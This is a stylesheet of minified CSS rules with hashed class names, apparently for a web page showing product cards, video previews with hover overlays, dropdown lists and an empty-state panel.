    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._12CDDdZC6FSa_Es-lJqB9v {
        font-weight: 400;
        font-size: 12px;
        line-height: 18px;
        display: flex;
        align-items: center;
        color: #6d6d6d
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._23UlILIOakxCPT4OGdzCGc {
        display: flex !important;
        align-items: center;
        margin-bottom: 20px
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._23UlILIOakxCPT4OGdzCGc ._3Rkf4VEtmpBUM4Ul3FR5qq {
        font-weight: 400;
        font-size: 12px;
        line-height: 18px;
        color: #6d6d6d;
        margin-right: 1rem
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._23UlILIOakxCPT4OGdzCGc .PnWTfgr0uc2mL5fm_FqTX {
        font-weight: 700;
        font-size: 14px;
        line-height: 22px;
        text-align: right;
        color: #2e2e2e;
        margin-left: auto
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL ._2zZCMbwVQU_sEuuREMYShE {
        font-weight: 400;
        font-size: 12px;
        line-height: 18px;
        color: #6d6d6d;
        margin-right: 1rem;
        margin-bottom: 12px !important
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL .Vc7t0AIL-_sdOxjSksiD0 {
        display: flex !important;
        margin-bottom: 1rem !important;
        align-items: center
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL .Vc7t0AIL-_sdOxjSksiD0 ._3kVGRSkiKGx62KOHhw3wPR {
        width: 74px;
        height: 74px;
        border-radius: 4px;
        margin-right: 10px;
        border: 1px solid #b6aaaa;
        overflow: hidden;
        min-width: 74px
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL .Vc7t0AIL-_sdOxjSksiD0 ._25XxVoXbKgGTlc0LemU3O0 {
        font-weight: 400;
        font-size: 14px;
        line-height: 20px;
        color: #000000
    }

    ._3kyB5AtTETzetYmfS627W1 ._2J9kY46hnzkArvV2KMRPlL .Vc7t0AIL-_sdOxjSksiD0 ._25XxVoXbKgGTlc0LemU3O0 ._2KwbuLKa00JsDxbvV8Hpja {
        margin-bottom: 8px;
        display: block;
        height: 24px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
        max-width: 180px;
        font-weight: 500;
        font-size: 16px;
        line-height: 20px;
        color: #000000
    }

    .mRdWUOrIDcAhpsMzT6ZXW {
        width: 100%
    }

    .mRdWUOrIDcAhpsMzT6ZXW ._25HF-aSpO3Xf0W_RDQ1dXF {
        position: relative;
        display: grid;
        grid-template-columns: 1fr 1fr 1fr 1.5fr;
        border: 1px solid #e9e9e9;
        border-radius: 8px;
        margin-top: 16px;
        padding: 16px
    }

    .mRdWUOrIDcAhpsMzT6ZXW ._25HF-aSpO3Xf0W_RDQ1dXF ._2YNHpkfggSjHd2-_Qt8Igq ._3TspOUWTccfwSRUvhv8ls- {
        color: #444;
        font-weight: 500;
        font-size: 14px;
        line-height: 14px
    }

    .mRdWUOrIDcAhpsMzT6ZXW ._25HF-aSpO3Xf0W_RDQ1dXF ._2YNHpkfggSjHd2-_Qt8Igq ._1RvGjAEi7hAnxxlvYRGbfd {
        margin-top: 5px;
        font-size: 16px;
        font-weight: 600;
        height: 25px;
        display: flex;
        align-items: center
    }

    .mRdWUOrIDcAhpsMzT6ZXW ._25HF-aSpO3Xf0W_RDQ1dXF ._2YNHpkfggSjHd2-_Qt8Igq ._117Gb34dCHH64_bIr8whu5 {
        display: grid;
        grid-template-columns: 50px 1fr
    }

    .mRdWUOrIDcAhpsMzT6ZXW ._25HF-aSpO3Xf0W_RDQ1dXF ._2YNHpkfggSjHd2-_Qt8Igq ._117Gb34dCHH64_bIr8whu5 * {
        cursor: pointer
    }

    .mRdWUOrIDcAhpsMzT6ZXW ._25HF-aSpO3Xf0W_RDQ1dXF ._2YNHpkfggSjHd2-_Qt8Igq ._117Gb34dCHH64_bIr8whu5 img {
        max-width: 100%;
        margin-right: 10px;
        border-radius: 4px;
        width: 50px;
        height: 50px;
        border: 1px solid #e9e9e9;
        overflow: hidden
    }

    .mRdWUOrIDcAhpsMzT6ZXW ._25HF-aSpO3Xf0W_RDQ1dXF ._2YNHpkfggSjHd2-_Qt8Igq ._117Gb34dCHH64_bIr8whu5 ._2xuDgZryLPt59Hqv9wy574 {
        padding-left: 8px
    }

    .mRdWUOrIDcAhpsMzT6ZXW ._25HF-aSpO3Xf0W_RDQ1dXF ._2YNHpkfggSjHd2-_Qt8Igq ._117Gb34dCHH64_bIr8whu5 ._2xuDgZryLPt59Hqv9wy574 ._1zP1CDY59oTxmb-28K6f1_ {
        overflow: hidden;
        white-space: nowrap;
        text-overflow: ellipsis;
        margin-top: 4px;
        font-weight: 500;
        font-size: 14px;
        line-height: 21px;
        color: #474747;
        max-width: 200px
    }

    .mRdWUOrIDcAhpsMzT6ZXW ._25HF-aSpO3Xf0W_RDQ1dXF ._2YNHpkfggSjHd2-_Qt8Igq ._117Gb34dCHH64_bIr8whu5 ._2xuDgZryLPt59Hqv9wy574 ._3cKbPTzhHOqmTaGJkrO-Zw {
        display: flex;
        margin-top: 6px
    }

    .mRdWUOrIDcAhpsMzT6ZXW ._25HF-aSpO3Xf0W_RDQ1dXF ._2YNHpkfggSjHd2-_Qt8Igq ._117Gb34dCHH64_bIr8whu5 ._2xuDgZryLPt59Hqv9wy574 .koU7oZlZWZLJFV-cguNMW {
        margin-right: 12px;
        padding-right: 12px;
        font-weight: 500;
        font-size: 12px;
        line-height: 20px;
        color: #000000;
        position: relative
    }

    .mRdWUOrIDcAhpsMzT6ZXW ._25HF-aSpO3Xf0W_RDQ1dXF ._2YNHpkfggSjHd2-_Qt8Igq ._117Gb34dCHH64_bIr8whu5 ._2xuDgZryLPt59Hqv9wy574 .koU7oZlZWZLJFV-cguNMW:after {
        content: '';
        position: absolute;
        right: 0;
        top: 50%;
        transform: translateY(-50%);
        width: 1px;
        height: 12px;
        background-color: #e9e9e9
    }

    .mRdWUOrIDcAhpsMzT6ZXW ._25HF-aSpO3Xf0W_RDQ1dXF ._2YNHpkfggSjHd2-_Qt8Igq ._117Gb34dCHH64_bIr8whu5 ._1QU7rmMuuaJvOB7JSRCpLJ {
        color: #1877f2;
        font-size: 12px;
        cursor: pointer
    }

    ._1DexfxIWZu8Ep95KU-Uwnr {
        min-height: 460px !important;
        padding: 0px 20px 0 !important
    }

    ._1DexfxIWZu8Ep95KU-Uwnr .ZR4CkTGJHQBQ6blftNEK_ {
        padding-bottom: 12px;
        position: relative;
        display: flex;
        justify-content: space-between;
        box-shadow: 0px 1px 8px rgba(0, 0, 0, 0.08);
        margin-left: -20px;
        margin-right: -20px;
        padding-left: 20px;
        padding-right: 20px
    }

    ._1DexfxIWZu8Ep95KU-Uwnr .ZR4CkTGJHQBQ6blftNEK_ .PxBvpklCDqzfqCHiNM57J {
        display: inline-flex;
        align-items: center
    }

    ._1DexfxIWZu8Ep95KU-Uwnr .ZR4CkTGJHQBQ6blftNEK_ .PxBvpklCDqzfqCHiNM57J ._2v2o8NxxV2BVhCcvm49z2Y {
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000
    }

    ._1DexfxIWZu8Ep95KU-Uwnr .ZR4CkTGJHQBQ6blftNEK_:after {
        content: '';
        display: block;
        width: calc(100% + 40px);
        position: absolute;
        bottom: 0;
        left: -20px
    }

    ._1DexfxIWZu8Ep95KU-Uwnr ._25ZYrvqOAj1wFEEawVApaQ {
        position: absolute;
        top: 0;
        right: -20px;
        bottom: 0;
        left: -20px;
        background: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 0 0 8px 8px;
        z-index: 100
    }

    ._1DexfxIWZu8Ep95KU-Uwnr ._25ZYrvqOAj1wFEEawVApaQ .UAL9qzWKHROW4-2_tMXQo {
        display: flex;
        flex-direction: column;
        align-items: center
    }

    ._1DexfxIWZu8Ep95KU-Uwnr ._25ZYrvqOAj1wFEEawVApaQ .UAL9qzWKHROW4-2_tMXQo ._11njWUor9rMbK2e2D7HVtR {
        font-size: 20px;
        font-weight: 600;
        color: #fff
    }

    ._1DexfxIWZu8Ep95KU-Uwnr ._25ZYrvqOAj1wFEEawVApaQ .UAL9qzWKHROW4-2_tMXQo .rMhb3VRr3Q1avv-73ClWj {
        margin-top: 20px
    }

    ._1DexfxIWZu8Ep95KU-Uwnr ._25ZYrvqOAj1wFEEawVApaQ .UAL9qzWKHROW4-2_tMXQo ._1cFejtYJmH8VQLH28M18Yq {
        margin-top: 30px
    }

    ._1DexfxIWZu8Ep95KU-Uwnr ._25ZYrvqOAj1wFEEawVApaQ .UAL9qzWKHROW4-2_tMXQo ._3lLranZ_xJUXup4qgj7EXC {
        color: #fff;
        margin-top: 10px
    }

    ._1DexfxIWZu8Ep95KU-Uwnr ._25ZYrvqOAj1wFEEawVApaQ .UAL9qzWKHROW4-2_tMXQo ._3lLranZ_xJUXup4qgj7EXC span {
        display: inline-block;
        color: #0080f7
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3CxxYDjPZ80Wcvpm95jcGc {
        padding-left: 20px;
        padding-right: 20px;
        padding-bottom: 12px;
        position: relative;
        display: flex;
        justify-content: space-between;
        box-shadow: 0px 1px 8px rgba(0, 0, 0, 0.08)
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3CxxYDjPZ80Wcvpm95jcGc ._1jVQ9kKOfG7HQrl2FmHKYl {
        margin-right: 10px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3CxxYDjPZ80Wcvpm95jcGc ._3k0Uop9-zRP1Ifba3G-PP- {
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000;
        display: inline-flex;
        align-items: center;
        cursor: pointer
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3CxxYDjPZ80Wcvpm95jcGc ._3k0Uop9-zRP1Ifba3G-PP- span {
        cursor: pointer
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3CxxYDjPZ80Wcvpm95jcGc:after {
        content: '';
        display: block;
        width: calc(100%);
        position: absolute;
        bottom: 0;
        left: -20px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._1fo_nAHhqCslSYTNu8KMKQ {
        position: relative;
        padding-top: 20px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D .O3K8OY640y3rr1T5kAKbQ {
        position: relative;
        padding-left: 20px;
        padding-right: 20px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D .O3K8OY640y3rr1T5kAKbQ ._1p5eusZVL7igCO5TfqIm3J {
        border-radius: 0 0 6px 6px;
        overflow: hidden
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._1Vt3ruwVBZeOrV4s-jb5IY {
        display: block;
        position: absolute;
        min-height: 300px;
        width: 100%;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._1QZmE3RVwwGHcvjMRSWzKT {
        margin-top: 20px;
        position: sticky;
        top: 0;
        background: #fff;
        z-index: 1000
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._31j0aPGHmqYc4l2wGhB2Nu {
        width: 110px;
        height: 110px;
        background-position: center;
        background-repeat: no-repeat;
        background-size: cover;
        border: 1px solid #f5f5f5;
        border-radius: 4px;
        cursor: pointer
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._2k8gWgNnd4nPrFesS7gNxZ {
        font-size: 14px;
        line-height: 24px;
        display: block;
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
        text-overflow: ellipsis;
        margin-bottom: 5px;
        cursor: pointer;
        color: #474747
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._2k8gWgNnd4nPrFesS7gNxZ:hover {
        color: var(--ah-secondary)
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._2H_TvBFdmTUijGpo1-nsXF {
        display: flex;
        align-items: center;
        gap: 16px;
        height: 100%;
        margin-top: 10px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D .aRHYWa97fC4gZ0Hz0o_cv {
        font-size: 10px;
        color: var(--ah-grey-200);
        width: 166px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D .aRHYWa97fC4gZ0Hz0o_cv a {
        font-size: 10px;
        text-decoration: underline;
        cursor: pointer
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D .g27CBb08qMiY4cg5v3Ygc {
        display: grid;
        grid-template-columns: 110px 1fr;
        gap: 16px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._2Jn_zCXI6Hry9FnW9EnXt9 {
        background: #f5f5f5;
        width: 1px;
        height: 200px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._1G0T2O84Rhvm8jUmFjvvXT {
        margin-top: 6px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3QK0Pv7Q50UEsN00HgZFm2 {
        display: flex
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D .m-inkrtRF0W_DNbJ5ENdA {
        line-height: 20px;
        color: var(--ah-grey-200);
        margin-bottom: 4px;
        min-width: 90px;
        font-size: 11px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._32Ozw76L6bVclZTy1OaJU {
        font-weight: 600;
        line-height: 22px;
        color: #474747;
        font-size: 11px
    }

    ._2xN9HtDV02LT13xU_icxOB .LsUIToOT_J56Swy2rNgfv {
        display: flex;
        align-items: center;
        margin-top: 20px;
        margin-bottom: 8px
    }

    ._2xN9HtDV02LT13xU_icxOB ._32KaT504IsboQ9XMzD6dnh {
        font-weight: 600;
        font-size: 16px;
        line-height: 24px;
        color: var(--ah-black-100)
    }

    ._2xN9HtDV02LT13xU_icxOB ._3K9YvemZDrWBTmaV4soALz {
        font-weight: 400;
        font-size: 12px;
        line-height: 18px;
        color: var(--ah-secondary);
        cursor: pointer;
        margin-left: auto
    }

    ._2xN9HtDV02LT13xU_icxOB ._3K9YvemZDrWBTmaV4soALz:hover {
        text-decoration: underline
    }

    ._2xN9HtDV02LT13xU_icxOB ._2IAmKnPV8G7gf-GHZpDtAy {
        width: 100%;
        height: 314px;
        position: relative;
        border-radius: 6px;
        overflow: hidden
    }

    ._2xN9HtDV02LT13xU_icxOB ._3uLvD7KmF0DlCJtqW8_Uqf {
        border: solid 1px var(--ah-grey-600);
        border-radius: 6px;
        height: 314px;
        width: 100%;
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._28ciL3eVvaSd6sRUFFNfwt video {
        width: 100% !important;
        height: 314px !important;
        object-fit: cover !important;
        overflow: hidden !important
    }

    ._28ciL3eVvaSd6sRUFFNfwt ._1Hl5fHhPQS7rOxJ45EbXRh {
        border-radius: 50%;
        width: 40px;
        height: 40px;
        background: rgba(255, 255, 255, 0.2);
        overflow: hidden;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._28ciL3eVvaSd6sRUFFNfwt .oxXeYoiGR74_Y_dUt5EZq {
        position: absolute;
        bottom: 0;
        left: 0;
        right: 0;
        z-index: 9;
        background: rgba(0, 0, 0, 0.7);
        padding-top: 8px;
        padding-bottom: 8px
    }

    ._28ciL3eVvaSd6sRUFFNfwt .oxXeYoiGR74_Y_dUt5EZq ._36-rvp11XiuuGYoWOSzMuh {
        display: flex
    }

    ._28ciL3eVvaSd6sRUFFNfwt .oxXeYoiGR74_Y_dUt5EZq ._2whe8jtjMowxi0RdSyM-a_ {
        width: 100%
    }

    ._28ciL3eVvaSd6sRUFFNfwt .oxXeYoiGR74_Y_dUt5EZq ._2whe8jtjMowxi0RdSyM-a_>div {
        text-align: center;
        color: #fff
    }

    ._28ciL3eVvaSd6sRUFFNfwt .oxXeYoiGR74_Y_dUt5EZq ._2hHMy5o_dQNUt3bNwm2spy {
        overflow: hidden;
        max-height: 0;
        transition: 0.3s;
        padding-left: 12px;
        padding-right: 12px
    }

    ._28ciL3eVvaSd6sRUFFNfwt .oxXeYoiGR74_Y_dUt5EZq ._2hHMy5o_dQNUt3bNwm2spy ._1n33jIT_I8apjuDcZy_rsa {
        display: flex;
        align-items: center;
        color: #fff;
        margin-bottom: 6px
    }

    ._28ciL3eVvaSd6sRUFFNfwt .oxXeYoiGR74_Y_dUt5EZq ._2hHMy5o_dQNUt3bNwm2spy ._1n33jIT_I8apjuDcZy_rsa img {
        margin-right: 8px;
        min-width: 32px;
        max-width: 32px;
        height: 32px;
        border-radius: 50%;
        overflow: hidden;
        object-fit: cover
    }

    ._28ciL3eVvaSd6sRUFFNfwt .oxXeYoiGR74_Y_dUt5EZq ._2hHMy5o_dQNUt3bNwm2spy ._1n33jIT_I8apjuDcZy_rsa span {
        color: #fff;
        display: block;
        display: -webkit-box !important;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 1;
        overflow: hidden;
        text-overflow: ellipsis;
        word-break: break-all
    }

    ._28ciL3eVvaSd6sRUFFNfwt .oxXeYoiGR74_Y_dUt5EZq ._2hHMy5o_dQNUt3bNwm2spy ._1a0I7dKanWxUr3RaKj2HaV {
        color: #fff;
        display: block;
        display: -webkit-box !important;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
        text-overflow: ellipsis;
        margin-bottom: 6px;
        word-break: break-all
    }

    ._28ciL3eVvaSd6sRUFFNfwt .oxXeYoiGR74_Y_dUt5EZq ._2hHMy5o_dQNUt3bNwm2spy ._2A4tFeGWY_J-G_nWdeRkaV {
        display: flex
    }

    ._28ciL3eVvaSd6sRUFFNfwt .oxXeYoiGR74_Y_dUt5EZq ._2hHMy5o_dQNUt3bNwm2spy ._2A4tFeGWY_J-G_nWdeRkaV>span {
        margin-right: 8px;
        display: inline-block;
        color: #fff
    }

    ._28ciL3eVvaSd6sRUFFNfwt:hover ._1Hl5fHhPQS7rOxJ45EbXRh {
        display: none
    }

    ._28ciL3eVvaSd6sRUFFNfwt:hover .oxXeYoiGR74_Y_dUt5EZq ._2hHMy5o_dQNUt3bNwm2spy {
        max-height: 200px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3sUemd9OW8d9S-izzO3F4X {
        display: flex;
        justify-content: space-between;
        align-items: center;
        height: 60px;
        margin-top: 20px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._1xazRJNzap75TAybT_UIV- {
        font-size: 16px;
        line-height: 16px;
        color: #2e2e2e;
        display: flex;
        align-items: center;
        font-weight: 500
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._1xazRJNzap75TAybT_UIV- strong {
        font-weight: 600;
        color: #000;
        margin: 0 4px;
        font-size: 12px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D .r8zGm4LyPsmrSzlSS5_Cw {
        display: grid;
        grid-template-columns: 1fr 1fr 1fr 1fr;
        gap: 45px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._2pEJ41pUIDYnIUyNOanCnV a {
        cursor: pointer
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._2pEJ41pUIDYnIUyNOanCnV a * {
        cursor: pointer
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._1R-0PLS-hfrupRuBI-9NQ_ {
        font-weight: 600;
        font-size: 13px;
        line-height: 22px;
        color: var(--ah-grey-100);
        margin-bottom: 4px;
        display: block;
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 1;
        overflow: hidden;
        text-overflow: ellipsis
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._1R-0PLS-hfrupRuBI-9NQ_:hover {
        color: var(--ah-red-100)
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._2rS8SA7DuMSSM0r4X3HUln {
        margin-bottom: 16px;
        height: 179px;
        background-position: center;
        background-repeat: no-repeat;
        background-size: cover;
        border-radius: 4px;
        border: 1px solid #f5f5f5
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3hXc6yhuXPFSHDqeDB9zUc {
        margin-bottom: 5px;
        display: grid;
        grid-template-columns: auto 1fr auto;
        align-items: center;
        gap: 8px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._2AGVfZtxn6AAwNrjsfjZbO {
        color: var(--ah-grey-100);
        font-size: 12px;
        line-height: 16px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D .x_8S3GFAY5Z0M3OPAIETe {
        font-weight: 600;
        font-size: 12px;
        line-height: 20px;
        color: var(--ah-grey-100)
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D .TKD92z8gCsZhKKIunRFhc {
        font-size: 12px;
        line-height: 16px;
        color: var(--ah-grey-200);
        display: flex;
        align-items: center;
        justify-content: flex-end;
        white-space: nowrap
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 {
        position: absolute;
        bottom: -30px;
        display: flex;
        width: 100%;
        align-items: center
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0>span {
        white-space: nowrap;
        max-width: 222px;
        text-overflow: ellipsis
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 ._3HNSBYNOhwwpFka9-W6fiZ {
        display: inline-flex;
        position: relative
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 ._3HNSBYNOhwwpFka9-W6fiZ.hCCkoOWmuSfTJqaJGI-d4 .e0uw_osntKz3v6_EOeRDV {
        top: 100%;
        opacity: 1;
        z-index: 1000;
        display: block
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 ._3HNSBYNOhwwpFka9-W6fiZ ._1jHAH7KuB66Kj-rdhOFpJ3 {
        color: #0076f1;
        cursor: pointer;
        display: inline-flex;
        align-items: center
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 ._3HNSBYNOhwwpFka9-W6fiZ ._1jHAH7KuB66Kj-rdhOFpJ3 b {
        display: inline-block;
        font-weight: 700;
        color: #0076f1;
        cursor: pointer
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 ._3HNSBYNOhwwpFka9-W6fiZ ._1jHAH7KuB66Kj-rdhOFpJ3 svg,
    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 ._3HNSBYNOhwwpFka9-W6fiZ ._1jHAH7KuB66Kj-rdhOFpJ3 path {
        fill: #0076f1
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 .e0uw_osntKz3v6_EOeRDV {
        position: absolute;
        top: 100%;
        left: 0;
        background: #fff;
        width: 330px;
        box-shadow: 0px 4px 4px rgba(0, 0, 0, 0.08);
        border-radius: 4px;
        max-height: 268px;
        overflow: auto;
        z-index: -1;
        opacity: 0;
        transition: all 0.25s ease-in-out;
        display: none
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 .e0uw_osntKz3v6_EOeRDV ._1mibJYL0sw20qJynRMtVju {
        padding: 10px 6px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 .e0uw_osntKz3v6_EOeRDV ._1mibJYL0sw20qJynRMtVju .gRQBkDfMTWqC-ES2CSPvc {
        display: grid;
        grid-template-columns: 60px 1fr;
        padding: 5px 4px;
        border-radius: 4px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 .e0uw_osntKz3v6_EOeRDV ._1mibJYL0sw20qJynRMtVju .gRQBkDfMTWqC-ES2CSPvc:hover {
        background: #f4f5f6
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 .e0uw_osntKz3v6_EOeRDV ._1mibJYL0sw20qJynRMtVju .gRQBkDfMTWqC-ES2CSPvc * {
        cursor: pointer
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 .e0uw_osntKz3v6_EOeRDV ._1mibJYL0sw20qJynRMtVju ._2BlyRX7k208pPfuXZpmT85 {
        position: relative;
        width: 60px;
        height: 60px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 .e0uw_osntKz3v6_EOeRDV ._1mibJYL0sw20qJynRMtVju ._2BlyRX7k208pPfuXZpmT85 img {
        width: 100%;
        border-radius: 4px
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 .e0uw_osntKz3v6_EOeRDV ._1mibJYL0sw20qJynRMtVju ._3lX4Drz2WFJpO5K8kuphgW {
        padding-left: 8px;
        display: flex;
        flex-direction: column;
        justify-content: center
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 .e0uw_osntKz3v6_EOeRDV ._1mibJYL0sw20qJynRMtVju ._12rbIkNzSeDguPAJ_xoIOl {
        display: block;
        text-overflow: ellipsis;
        overflow: hidden;
        white-space: nowrap;
        max-width: 230px;
        color: #006fe3
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 .e0uw_osntKz3v6_EOeRDV ._1mibJYL0sw20qJynRMtVju ._3FkjE7V83ay1fSP3XsEAgB span {
        display: inline-block
    }

    ._2ceQ0Prs5EsSH3U4-WWh6f._3y8w2qiN9k9CXRn8QXUJ_D ._3qhrA0CorzW4O7PKulSmX0 .e0uw_osntKz3v6_EOeRDV ._1mibJYL0sw20qJynRMtVju ._2rsidL_GTW58visOAHvN7A {
        background: rgba(0, 0, 0, 0.7);
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        border-radius: 4px;
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._1Ga04dLndV0BeKj9AewsqD {
        position: relative !important;
        margin-top: 26px !important
    }

    ._1Ga04dLndV0BeKj9AewsqD ._2vUNv1tWysYyWPlJwiWjTp {
        padding: 56px 0;
        border-top: 1px solid #e2e4e5;
        min-height: 350px
    }

    ._1Ga04dLndV0BeKj9AewsqD ._2vUNv1tWysYyWPlJwiWjTp ._23LgKiyYSDpOjWVArNJZyF {
        text-align: center
    }

    ._1Ga04dLndV0BeKj9AewsqD ._2vUNv1tWysYyWPlJwiWjTp ._23LgKiyYSDpOjWVArNJZyF img {
        display: inline-block
    }

    ._1Ga04dLndV0BeKj9AewsqD ._2vUNv1tWysYyWPlJwiWjTp ._1_lKm-MRi4L5A753LXovzk {
        font-size: 20px;
        font-weight: 600;
        text-align: center;
        color: #262626
    }

    ._1Ga04dLndV0BeKj9AewsqD ._2vUNv1tWysYyWPlJwiWjTp ._3khv559AECp9GzOvBJB6ZA {
        font-size: 12px;
        font-weight: 400;
        text-align: center;
        color: #7b7b7b
    }

